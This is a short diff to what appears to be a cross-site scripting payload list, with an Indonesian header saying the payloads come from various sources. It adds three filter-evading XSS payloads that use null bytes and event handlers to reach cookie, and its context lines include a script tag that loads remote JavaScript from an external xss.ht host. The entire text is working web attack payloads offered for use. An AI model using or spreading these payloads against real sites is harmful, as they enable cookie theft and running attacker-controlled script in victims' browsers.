@@ -3,6 +3,12 @@
 PAYLOAD INI DIDAPATKAN DARI BERBAGAI SUMBER YANG DITEMUKAN OLEH PENULIS
 -----------------------------------------------------------------------
 
+test"><body %00 onControl hello onmouseleave=confirm(cookie) x>XSS
+
+test"><html><select %00 onControl onpointerenter=prompt(cookie) hello>
+
+test"><input %00 onControl hello oninput=confirm(cookie) x>
+
 "><script src=https://zhirosec.xss.ht></script>
 
 </script><script>alert(document.domain)</script>
